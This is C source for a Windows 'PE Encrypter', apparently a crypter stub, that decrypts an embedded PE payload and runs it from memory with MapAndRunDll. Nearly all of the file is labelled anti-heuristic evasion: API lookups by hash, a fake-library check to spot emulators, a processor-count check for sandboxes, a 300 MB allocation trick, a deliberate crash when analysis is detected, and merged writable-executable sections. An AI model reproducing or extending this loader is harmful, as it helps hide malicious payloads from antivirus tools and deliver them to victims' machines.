/*
	PE Encrypter: decrypt PE from payload and run it
	By Solodov A. N. aka SANshine aka Paketov aka Antichrist aka CatsEater aka KittyEater aka UniverseFucker
	2026
*/

#include <stdint.h>

#include <Windows.h>
#include <Shlwapi.h>
#include <winternl.h>
#include <commctrl.h>

#include "main.h"
#include "Settings.h"
#include "XTea.h"
#include "PayloadLoader.h"
#include "EncryptedPayload.h"

//#pragma comment(linker, "/section:.etg,WRSE")
#ifdef _WIN64
# pragma comment(linker, "/BASE:0x140000000")
#else

#endif

#ifndef _DEBUG
# ifdef EP_IS_CONSOLE
#  pragma comment(linker, "/ENTRY:\"main\"")
# else
#  pragma comment(linker, "/ENTRY:\"wWinMain\"")
# endif

# pragma optimize("gsy",on)
# pragma comment(linker,"/merge:.rdata=.data")
# pragma comment(linker,"/merge:.text=.data")

# pragma comment(linker,"/SECTION:.data,RWE")



#endif

#if defined(EP_USE_MANIFEST_FOR_WONDER_CONTROLS) && !defined(EP_IS_CONSOLE)
# pragma comment(linker, "\"/manifestdependency:type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
#endif

EP_NOINLINE int _av_exit() {
	//__rand_win_api_call(EP_RANDOM1, __COUNTER__);
	int* addr = (int*)__rdtsc();
	*addr = 0;
	//__rand_win_api_call(EP_RANDOM2, __COUNTER__);
	return _av_exit();
}

HMODULE (WINAPI*ep_LoadLibraryA)(LPCSTR lpLibFileName);
LPVOID(WINAPI* ep_HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
HANDLE(WINAPI*ep_GetProcessHeap)();

HMODULE kernell32;


#ifdef EP_IS_CONSOLE
int main()
#else
int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShowCmd)
#endif
{
	////Begin Antiheuristic 
	HANDLE hProcessHeap;
	SYSTEM_INFO SysInfo;
	HMODULE LdDll;

	kernell32 = ep_get_module_handle_by_hash(0x12B9375Cu ^ (uint32_t)EP_XOR_HASH_FUNCTION);//kernel32
	ep_LoadLibraryA = ep_get_proc_addr_by_hash(kernell32, 0x896caa0c ^ (uint32_t)EP_XOR_HASH_FUNCTION);
	//__rand_win_api_call(EP_RANDOM1, __COUNTER__);
	LdDll = ep_LoadLibraryA(EP_FAKE_LIB_NAME);
	if (LdDll != NULL) {
		_av_exit();
		//return 1;
	}
	//__rand_win_api_call(EP_RANDOM2, __COUNTER__);

	VOID(WINAPI*ep_GetSystemInfo)(LPSYSTEM_INFO lpSystemInfo) = ep_get_proc_addr_by_hash(kernell32, 0x442c8353u ^ (uint32_t)EP_XOR_HASH_FUNCTION);
	ep_GetSystemInfo(&SysInfo);
	if (SysInfo.dwNumberOfProcessors < 2) {
		_av_exit();
		//return 1;
	}
	//__rand_win_api_call(EP_RANDOM3, __COUNTER__);
	ep_HeapAlloc = ep_get_proc_addr_by_hash(kernell32, 0x7d37d889u ^ (uint32_t)EP_XOR_HASH_FUNCTION);
	ep_GetProcessHeap = ep_get_proc_addr_by_hash(kernell32, 0xaa29a3e5u ^ (uint32_t)EP_XOR_HASH_FUNCTION);

	char* Arr = ep_HeapAlloc(hProcessHeap = ep_GetProcessHeap(), 0, 1024 * 1024 * 300 + (EP_RANDOM3 % 6000));
	if (Arr == NULL) {
		//return 1;
		_av_exit();
	}
	//__rand_win_api_call(EP_RANDOM4, __COUNTER__);
	//DWORD TickCount1 = GetTickCount();
	//Sleep(300 + (EP_RANDOM3 % 20));
	//DWORD TickCount2 = GetTickCount();
	//if ((TickCount2 - TickCount1) < 200) {
		//_av_exit();
	//	return 1;
	//}
	//__rand_win_api_call(EP_RANDOM5, __COUNTER__);

	ep_memset(Arr, 0, 1024 * 1024 * 300 + (EP_RANDOM3 % 6000));
	BOOL(WINAPI*ep_HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem) = ep_get_proc_addr_by_hash(kernell32, 0xc1fbe698u ^ (uint32_t)EP_XOR_HASH_FUNCTION);
	ep_HeapFree(hProcessHeap, 0, Arr);
	//__rand_win_api_call(EP_RANDOM1, __COUNTER__);
	////End Antiheuristic 

	//Load PE payload
	MapAndRunDll(EncryptedPayload, sizeof(EncryptedPayload));
	return 0;
}
